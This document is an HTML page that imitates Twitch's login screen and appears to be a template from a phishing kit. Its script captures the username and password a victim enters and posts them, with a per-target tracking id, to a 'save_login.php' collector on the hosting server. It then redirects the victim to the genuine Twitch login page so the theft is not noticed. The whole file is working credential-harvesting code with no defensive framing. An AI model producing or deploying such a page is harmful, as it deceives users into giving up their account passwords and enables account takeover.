<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Log In - Twitch</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Roobert",Helvetica,Arial,sans-serif;background:#0e0e10;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px}
.tw{font-size:32px;font-weight:700;color:#fff;margin-bottom:8px}
.tw span{color:#9146ff}
h1{color:#efeff1;font-size:24px;margin-bottom:24px}
input{width:100%;height:40px;background:#18181b;border:1px solid #53535f;border-radius:4px;color:#efeff1;padding:0 12px;margin-bottom:12px;font-size:14px}
.btn-submit{width:100%;height:40px;background:#9146ff;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer}
</style></head><body><div class="card"><div class="tw">Twitch</div><h1>Log in to Twitch</h1><form id="loginForm"><input type="text" id="email" placeholder="Username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log In</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
(function(){
var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    var login = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
    var btn = document.querySelector(".btn-submit");
    var label = btn.textContent;
    btn.textContent = "Please wait…";
    btn.disabled = true;
    $.ajax({
        type: "POST",
        url: BASE_URL + "save_login.php",
        data: { tid: tid, login: login, password: password, template: "twitch" },
        dataType: "json",
        success: function (data) {
            if (data && data.ok) { window.location.href = "https:\/\/www.twitch.tv\/login"; return; }
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        },
        error: function () {
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        }
    });
});
})();
</script></body></html>
